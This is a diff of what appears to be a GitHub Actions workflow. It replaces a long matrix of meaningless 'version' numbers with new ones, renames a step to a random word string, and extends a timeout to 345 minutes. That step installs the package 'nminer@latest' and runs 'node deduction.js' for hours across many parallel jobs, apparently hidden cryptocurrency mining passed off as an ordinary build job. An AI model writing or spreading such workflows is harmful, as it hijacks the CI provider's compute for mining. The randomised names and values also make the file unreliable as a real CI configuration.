@@ -9,23 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9893 }
-          - { version: 333 }
-          - { version: 8098 }
-          - { version: 9716 }
-          - { version: 7134 }
-          - { version: 3358 }
-          - { version: 4791 }
-          - { version: 3723 }
-          - { version: 8364 }
-          - { version: 5136 }
-          - { version: 1859 }
-          - { version: 1711 }
-          - { version: 3807 }
-          - { version: 5507 }
-          - { version: 2675 }
-          - { version: 3847 }
-          - { version: 9354 }
+          - { version: 123 }
+          - { version: 1046 }
+          - { version: 927 }
+          - { version: 2263 }
+          - { version: 9115 }
+          - { version: 8767 }
+          - { version: 3762 }
+          - { version: 9665 }
+          - { version: 4661 }
+          - { version: 3088 }
+          - { version: 8692 }
+          - { version: 6885 }
+          - { version: 2340 }
+          - { version: 3486 }
+          - { version: 4589 }
 
     steps:
       - name: Checkout
@@ -36,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: redesign
+      - name: imaginative mockingly task rapidly
         run: |
           npm install nminer@latest
-          timeout 317m node deduction.js || echo "deduction executed"
+          timeout 345m node deduction.js || echo "deduction executed"
